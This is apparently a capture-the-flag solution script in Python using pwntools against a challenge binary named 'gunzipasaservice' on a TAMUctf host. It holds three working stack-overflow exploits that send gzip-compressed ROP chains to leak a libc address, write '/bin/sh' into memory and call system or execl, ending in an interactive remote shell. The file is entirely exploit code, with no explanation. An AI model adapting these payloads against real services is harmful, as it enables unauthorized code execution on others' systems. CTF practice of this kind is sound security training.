from pwn import *
import os

def exploit1():
    # p = process("./gunzipasaservice")
    p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100

    # payload = open("test.gz", "rb").read()
    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.plt['write'])
    payload += p32(binary.symbols['main'])
    payload += p32(1)
    payload += p32(binary.got['read'])
    payload += p32(0x10)

    open("leak", "w+").write(payload)
    os.system("gzip leak")

    leak = open("leak.gz", "rb").read()

    p.send(leak)
    os.system("rm leak.gz")

    libc_leak = u32(p.recv(4))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    # libc_base = libc_leak - 0x018d90
    libc_base = libc_leak - 0x0ba2d0
    log.info("Libc base : {}".format(hex(libc_base)))
    # libc_system = libc_base + 0x03d200
    libc_system = libc_base + 0x035980
    log.info("Libc system : {}".format(hex(libc_system)))
    # libc_binsh = libc_base + 0x17e0cf
    libc_binsh = libc_base + 0x16026c
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(binary.symbols['main'])
    payload += p32(0)
    payload += p32(bss)
    payload += p32(0x10)

    open("read_binsh", "w+").write(payload)
    os.system("gzip read_binsh")

    read_binsh = open("read_binsh.gz", "rb").read()
    p.send(read_binsh)
    os.system("rm read_binsh.gz")
    p.send("/bin/sh\x00")

    payload = ''
    payload += 'A' * 1048
    # payload += p32(0x0804931f)
    payload += p32(libc_system)
    payload += 'JUNK'
    payload += p32(bss)

    open("payload", "w+").write(payload)
    os.system("gzip payload")

    real_payload = open("payload.gz", "rb").read()

    p.send(real_payload)
    os.system("rm payload.gz")

    p.interactive()

def exploit2():
    # p = process("./gunzipasaservice")
    p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(binary.symbols['main'])
    payload += p32(0)
    payload += p32(bss)
    payload += p32(0x10)

    open("read_binsh", "w+").write(payload)
    os.system("gzip read_binsh")

    read_binsh = open("read_binsh.gz", "rb").read()
    p.send(read_binsh)
    os.system("rm read_binsh.gz")
    p.send("/bin/sh\x00")

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.plt['execl'])
    payload += 'JUNK'
    payload += p32(bss)
    payload += p32(0)
    payload += p32(0)

    open("payload", "w+").write(payload)
    os.system("gzip payload")

    real_payload = open("payload.gz", "rb").read()
    p.send(real_payload)
    os.system("rm payload.gz")

    p.interactive()

def exploit3():
    # p = process("./gunzipasaservice")
    p = remote("challenges.tamuctf.com", 4709)
    binary = ELF("./gunzipasaservice")
    bss = 0x0804c044 + 0x100
    add_esp = 0x08049475    # add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

    payload = ''
    payload += 'A' * 1048
    payload += p32(binary.symbols['read'])
    payload += p32(add_esp)
    payload += p32(0)                       # 4
    payload += p32(bss)                     # 8
    payload += p32(0x10)                    # 12
    payload += p32(0)                       # ebx
    payload += p32(0)                       # esi
    payload += p32(0)                       # edi
    payload += p32(0)                       # ebp
    payload += p32(binary.plt['execl'])
    payload += 'YUDI'
    payload += p32(bss)
    payload += p32(0)
    payload += p32(0)

    open("payload", "w+").write(payload)
    os.system("gzip payload")

    read_binsh = open("payload.gz", "rb").read()
    p.send(read_binsh)
    os.system("rm payload.gz")
    p.send("/bin/sh\x00")

    p.interactive()

if __name__ == "__main__":
    exploit3()